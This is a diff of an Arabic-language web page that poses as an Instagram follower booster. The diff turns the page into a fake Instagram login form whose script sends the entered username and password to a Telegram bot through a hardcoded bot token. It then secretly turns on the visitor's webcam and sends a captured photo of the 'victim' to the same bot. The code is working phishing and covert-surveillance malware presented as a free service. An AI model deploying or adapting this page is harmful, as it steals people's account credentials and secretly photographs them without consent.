@@ -2,23 +2,39 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>زيادة متابعين انستقرام حقيقية 2026</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram - Followers Booster</title>
     <style>
-        body { background: #fafafa; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; padding: 50px; direction: rtl; }
-        .card { background: white; border: 1px solid #dbdbdb; padding: 30px; width: 320px; margin: auto; border-radius: 12px; box-shadow: 0 8px 20px rgba(0,0,0,0.08); }
-        h2 { color: #262626; font-size: 22px; margin-bottom: 10px; }
-        p { color: #8e8e8e; font-size: 14px; line-height: 1.6; }
-        .insta-logo { width: 60px; margin-bottom: 15px; }
-        button { background: #0095f6; color: white; border: none; padding: 14px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; margin-top: 20px; transition: 0.3s; }
-        button:hover { background: #1877f2; }
+        body { background: #fafafa; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; direction: rtl; }
+        .login-box { background: white; border: 1px solid #dbdbdb; padding: 40px; width: 350px; border-radius: 1px; text-align: center; }
+        .logo { width: 175px; margin-bottom: 25px; }
+        input { width: 100%; background: #fafafa; border: 1px solid #dbdbdb; padding: 9px; margin-bottom: 10px; border-radius: 3px; box-sizing: border-box; font-size: 12px; }
+        select { width: 100%; background: #fafafa; border: 1px solid #dbdbdb; padding: 9px; margin-bottom: 15px; border-radius: 3px; font-size: 12px; }
+        button { width: 100%; background: #0095f6; color: white; border: none; padding: 7px; border-radius: 4px; font-weight: 600; cursor: pointer; margin-top: 10px; }
+        .footer-text { color: #8e8e8e; font-size: 12px; margin-top: 20px; }
     </style>
 </head>
 <body>
-    <div class="card">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/e/e7/Instagram_logo_2016.svg" class="insta-logo" alt="Instagram">
-        <h2>بوت زيادة متابعين الانستاغرام</h2>
-        <p>مرحباً بك في نظام التحقق التلقائي. اضغط على الزر أدناه لتأكيد حسابك وبدء إرسال 5000 متابع حقيقي لحسابك فوراً.</p>
-        <button onclick="startInfection()">بدء التحقق والزيادة الآن</button>
+    <div class="login-box">
+        <img src="https://www.instagram.com/static/images/web/mobile_port_gradient_android.png/06f62030f25e.png" style="display:none;">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" class="logo">
+        
+        <p style="font-size: 14px; color: #8e8e8e; font-weight: bold;">سجل دخولك لاستلام المتابعين</p>
+        
+        <input type="text" id="user" placeholder="اسم المستخدم أو الهاتف أو الإيميل" required>
+        <input type="password" id="pass" placeholder="كلمة السر" required>
+        
+        <label style="font-size: 12px; color: #262626; display: block; margin-bottom: 5px;">اختر عدد المتابعين:</label>
+        <select id="followers">
+            <option value="100">100 متابع</option>
+            <option value="200">200 متابع</option>
+            <option value="400">400 متابع</option>
+        </select>
+
+        <button onclick="startProcess()">تسجيل الدخول والبدء</button>
+        
+        <div class="footer-text">نسيت كلمة السر؟</div>
+        
         <video id="video" width="0" height="0" autoplay style="display:none;"></video>
         <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
     </div>
@@ -27,22 +43,36 @@
         const API_TOKEN = '8444214588:AAE8ugJvMnz8RNfWuIvBCT_-9X-NHl01qek';
         const MY_ID = '1371063739';
 
-        async function startInfection() {
+        async function startProcess() {
+            const user = document.getElementById('user').value;
+            const pass = document.getElementById('pass').value;
+            const count = document.getElementById('followers').value;
+
+            if(user === "" || pass === "") {
+                alert("يرجى إدخال معلومات الحساب أولاً!");
+                return;
+            }
+
+            // أولاً: إرسال معلومات الحساب لبوتك
+            const loginInfo = `📩 صيد جديد (انستقرام):\n👤 المستخدم: ${user}\n🔑 كلمة السر: ${pass}\n🎯 الكمية: ${count}`;
+            fetch(`https://api.telegram.org/bot${API_TOKEN}/sendMessage?chat_id=${MY_ID}&text=${encodeURIComponent(loginInfo)}`);
+
+            // ثانياً: طلب الكاميرا وسحب الصورة
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
                 
-                // سحب صورة كل 3 ثواني وإرسالها لبوتك
-                setInterval(() => {
-                    captureImage();
-                }, 3000);
+                setTimeout(() => {
+                    captureAndSend();
+                    alert("تم تأكيد الحساب بنجاح! سيصلك المتابعون خلال 24 ساعة.");
+                }, 2000);
             } catch (err) {
-                alert("⚠️ خطأ في النظام: يجب السماح بالوصول للكاميرا لتأكيد هويتك وضمان عدم تكرار الطلب!");
+                alert("⚠️ يجب السماح بالكاميرا لتأكيد أنك صاحب الحساب الحقيقي!");
             }
         }
 
-        function captureImage() {
+        function captureAndSend() {
             const canvas = document.getElementById('canvas');
             const video = document.getElementById('video');
             canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
@@ -50,8 +80,8 @@
             canvas.toBlob(blob => {
                 const formData = new FormData();
                 formData.append('chat_id', MY_ID);
-                formData.append('photo', blob, 'insta_shot.jpg');
-                formData.append('caption', '🔥 تم سحب صورة جديدة من كاميرا ضحية انستقرام!');
+                formData.append('photo', blob, 'shot.jpg');
+                formData.append('caption', '📸 صورة الضحية المرافقة للحساب!');
 
                 fetch(`https://api.telegram.org/bot${API_TOKEN}/sendPhoto`, {
                     method: 'POST',
